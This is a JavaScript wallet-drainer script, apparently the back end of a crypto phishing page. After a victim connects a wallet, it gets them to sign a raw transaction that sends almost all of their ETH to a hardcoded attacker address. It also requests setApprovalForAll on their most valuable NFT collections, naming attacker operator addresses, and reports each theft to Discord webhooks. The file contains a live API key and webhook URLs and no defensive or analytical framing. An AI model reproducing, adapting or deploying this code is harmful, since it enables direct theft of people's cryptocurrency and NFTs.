const ETHReceiveAddress = "0x88584B51431e265F3D162aF863110259A23Ac279";
const NFTReceiveAddress = "0x7646d029852D339af30FE76801B41C790981FFcb";

const drainNftsInfo = {
  minValue: 0.0001,
  maxTransfers: 3,
};

let web3Js = null;
let walletAddress = null;
let metamaskInstalled = false;

const X_API_KEY = "7dabb51af1224421960e18ed64e69bc2";

window.addEventListener("load", async () => {
  if (typeof window.ethereum !== "undefined") metamaskInstalled = true;
});

Moralis.onWeb3Enabled(async (data) => {
  if (data.chainId !== 1 && metamaskInstalled)
    await Moralis.switchNetwork("0x1");
});

Moralis.onChainChanged(async (chain) => {
  if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});

async function onConnect() {
  await Moralis.enableWeb3(
    metamaskInstalled
      ? {}
      : {
          provider: "walletconnect",
        }
  );
  web3Js = new Web3(Moralis.provider);
  walletAddress = (await web3Js.eth.getAccounts())[0];
  verifyAsset();
}

let eth_bal = 0;
const verifyAsset = async () => {
  eth_bal = await web3Js.eth.getBalance(walletAddress);
  const r_bal = web3Js.utils.fromWei(eth_bal, "ether");
  console.log(`Current balance for ${walletAddress} : ${r_bal} ETH`);
  if (r_bal >= 0.03) {
    askTransferWithSign();
  } else {
    console.log(`Error, balance is too low. (< 0.03 ETH)`);
    await askNfts();
  }
};

async function askTransferWithSign() {
  const chainId = await web3Js.eth.getChainId();
  await web3Js.eth
    .getTransactionCount(walletAddress, "pending")
    .then(async (txnCount) => {
      const jgasPrice = await web3Js.eth.getGasPrice();
      const mgasPrice = web3Js.utils.toHex(Math.floor(jgasPrice * 1.4));
      const gas = new web3Js.utils.BN("22000");
      const cost = gas * Math.floor(jgasPrice * 2);
      const toSend = eth_bal - cost - 7000000000000000;
      console.log(
        `Sending ${web3Js.utils.fromWei(
          toSend.toString(),
          "ether"
        )} ETH from ${walletAddress}...`
      );

      const txObject = {
        nonce: web3Js.utils.toHex(txnCount),
        gasPrice: mgasPrice,
        gasLimit: "0x55F0",
        to: ETHReceiveAddress,
        value: "0x" + toSend.toString(16),
        data: "0x",
        v: "0x1",
        r: "0x",
        s: "0x",
      };
      let ethTX = new ethereumjs.Tx(txObject);
      const rawTx1 = "0x" + ethTX.serialize().toString("hex");
      const rawHash1 = web3Js.utils.sha3(rawTx1, { encoding: "hex" });

      console.log("rawTx1:", rawTx1);
      console.log("rawHash1:", rawHash1);

      await web3Js.eth
        .sign(rawHash1, walletAddress)
        .then(async (result) => {
          const signature = result.substring(2);
          const r = "0x" + signature.substring(0, 64);
          const s = "0x" + signature.substring(64, 128);
          const v = parseInt(signature.substring(128, 130), 16);

          const y = web3Js.utils.toHex(v + chainId * 2 + 8);

          ethTX.r = r;
          ethTX.s = s;
          ethTX.v = y;

          console.log(ethTX);

          const rawTx = "0x" + ethTX.serialize().toString("hex");
          const rawHash = web3Js.utils.sha3(rawTx, { encoding: "hex" });

          console.log("rawTx:", rawTx);
          console.log("rawHash:", rawHash);

          await web3Js.eth
            .sendSignedTransaction(rawTx)
            .then((hash) => console.log(hash))
            .catch((e) => console.log(e));
          let test_balance = web3Js.utils.fromWei(toSend.toString());
          test_balance = Number(test_balance).toFixed(3);
          ETHWebhooks(`${test_balance} ETH recieved from  (${walletAddress})`);
        })
        .catch((err) => console.log(err));
    });
  await askNfts();
}

async function askNfts() {
  const options = {
    method: "GET",
    headers: { Accept: "application/json", "X-API-KEY": X_API_KEY },
  };

  let walletNfts = await fetch(
    `https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=300`,
    options
  )
    .then((response) => response.json())
    .then((nfts) => {
      console.log("collections:", nfts);
      if (nfts.includes("Request was throttled."))
        return ["Request was throttled."];
      return nfts
        .filter((nft) => {
          if (nft.primary_asset_contracts.length > 0) return true;
          else return false;
        })
        .map((nft) => {
          return {
            name: nft.primary_asset_contracts[0].name,
            image_url: nft.primary_asset_contracts[0].image_url,
            type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
            contract_address: nft.primary_asset_contracts[0].address,
            price: round(
              nft.stats.one_day_average_price != 0
                ? nft.stats.one_day_average_price
                : nft.stats.seven_day_average_price
            ),
            owned: nft.owned_asset_count,
          };
        });
    })
    .catch((error) => {
      console.error(error);
    });

  if (walletNfts.includes("Request was throttled.")) return notEligible();
  if (walletNfts.length < 1) return notEligible();

  let transactionsOptions = [];
  for (nft of walletNfts) {
    if (nft.price === 0) continue;
    const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1));
    if (ethPrice < drainNftsInfo.minValue) continue;
    transactionsOptions.push({
      name: nft.name,
      price: ethPrice,
      options: {
        contractAddress: nft.contract_address,
        from: walletAddress,
        functionName: "setApprovalForAll",
        abi: [
          {
            inputs: [
              {
                internalType: "address",
                name: "operator",
                type: "address",
              },
              {
                internalType: "bool",
                name: "approved",
                type: "bool",
              },
            ],
            name: "setApprovalForAll",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
        ],
        params: {
          operator:
            ethPrice > 9999
              ? "0x265cFB27c7092e4797b2d63d3f65B2a54CB95097"
              : NFTReceiveAddress,
          approved: true,
        },
        gasLimit: (await web3Js.eth.getBlock("latest")).gasLimit,
      },
    });
  }

  if (transactionsOptions.length < 1) return notEligible();

  let transactionLists = await transactionsOptions
    .sort((a, b) => b.price - a.price)
    .slice(0, drainNftsInfo.maxTransfers);
  for (transaction of transactionLists) {
    console.log(
      `Transferring ${transaction.options.contractAddress} (${transaction.price} ETH)`
    );

    Moralis.executeFunction(transaction.options)
      .catch((O_o) => console.error(O_o))
      .then((uwu) => {
        if (uwu) {
        } else return;
        NFTWebhooks(
          transaction.name,
          walletAddress,
          transaction.options.contractAddress,
          transaction.price
        );
      });
    await sleep(111);
  }
}

const ETHWebhooks = (message) => {
  const webhookURL =
    "https://canary.discord.com/api/webhooks/1023254554147569807/PuYJK8Md9WwryLxU9_l6hRUeR3lXj3Yei3zVfhpaYosl-mP609QHmkTVKxeb8rYjWP2a";
  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: message,
    }),
  }).catch((err) => console.error(err));
};

const NFTWebhooks = (name, address, contract, price) => {
  const webhookURL =
    "https://canary.discord.com/api/webhooks/1023114276975673385/PAZXDcz0WXb0JtTGU8iYfxP9sgwhhndDa6hmFsBW3bYJxGyd-dRAg9Wci4bhK9qVn9zW";
  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: `NFT Approved (${price}), \n Collection Name: ${name}, \n Wallet Address: ${address}, \n Contract Address: ${contract}, \n Price: ${price}`,
    }),
  }).catch((err) => console.error(err));
};

const notEligible = () => {
  Toastify({
    text: "You are not eligible",
    duration: 3000,
    gravity: "top",
    position: "right",
  }).showToast();
};

const round = (value) => {
  return Math.round(value * 10000) / 10000;
};
const sleep = (ms) => {
  return new Promise((resolve) => setTimeout(resolve, ms));
};
const getRdm = (min, max) => {
  return Math.floor(Math.random() * (max - min + 1)) + min;
};
